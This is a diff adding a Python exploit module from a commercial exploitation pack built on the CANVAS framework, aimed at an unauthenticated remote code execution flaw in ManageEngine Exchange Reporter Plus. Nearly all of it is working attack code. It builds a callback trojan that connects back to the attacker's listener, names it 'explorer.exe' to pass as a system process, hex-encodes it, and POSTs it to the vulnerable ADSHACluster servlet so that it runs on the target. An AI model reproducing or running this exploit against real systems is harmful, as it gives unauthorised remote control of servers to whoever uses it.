@@ -1,0 +1,152 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+import sys
+import random
+import time
+import thread
+import base64
+import urllib, urllib2
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.canvasos import *
+
+import struct
+import canvasengine
+import re
+
+# GUI info
+NAME = "ManageEngine Exchange Reporter Plus Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in ManageEngine Exchange Reporter Plus ADSHACluster Servlet"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "ManageEngine"
+DOCUMENTATION["Date public"] = "2018.06.28"
+DOCUMENTATION["VersionsAffected"] = "<= 5.3 build 5310"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "https://security.szurek.pl/manage-engine-exchange-reporter-plus-unauthenticated-rce.html"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.TROJANMODE = 0
+    	self.setInfo(DESCRIPTION)
+    	self.name = NAME       
+    	self.protocol = "http"
+    	self.port = 8181
+    	self.sslport = 8181
+    	self.https = 0                
+    	self.version = 0
+    	self.cmd = ""    	        
+    	self.trojanname = "explorer.exe"                
+    	return
+
+ 
+    def maketrojan(self):   
+    	t_os = canvasos("Windows")
+    	t_os.arch = "X86"
+        
+    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))            	
+    	file(self.trojanname, "wb").write(self.mosdeftrojan)
+    	self.setInfo("%s - done"%(NAME))
+    	ret = len(self.mosdeftrojan) != 0
+
+
+    def to_hex(self, s):
+        lst = []
+        for ch in s:
+            hv = hex(ord(ch)).replace('0x', '')
+            if len(hv) == 1:
+                hv = '0'+hv
+            lst.append(hv)
+    
+        return reduce(lambda x,y:x+y, lst)
+    
+    
+    def neededListenerTypes(self):
+    	from canvasengine import WIN32MOSDEF
+    	return [WIN32MOSDEF]
+ 
+
+    def run(self):    	    	               
+    	# Check arguments
+    	self.host = self.target.interface
+    	self.port = int(self.argsDict.get("port", self.port))    
+    	self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    	self.https = int(self.argsDict.get("https", self.https))     
+                        	                	               
+    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+    	self.log("Attacking %s:%d"%(self.host, self.port))                                  	
+
+        self.maketrojan()
+                    	    		
+        exe = self.to_hex(open(self.trojanname, "rb").read())
+                                   
+        if self.https == 0:
+            self.protocol = "http"
+        else:
+            self.protocol = "https"
+            self.port = self.sslport
+
+        ua = spkproxy.UserAgent("", exploit=self)
+    	ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")
+                
+        params = urllib.urlencode({'MTCALL':"nativeClient", "BCP_RLL":"0102", 'BCP_EXE':exe })
+        url = "/exchange/servlet/ADSHACluster"    
+        mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)                
+        data = ua.POST(mainurl, params)    
+
+    	return 1
+ 
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
+
+    	i = 0
+
+    	print 'Available versions:'
+
+    	for listline in targets.values():
+    		print '\t%d: %s'%(i, listline)
+    		i = i + 1
+
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
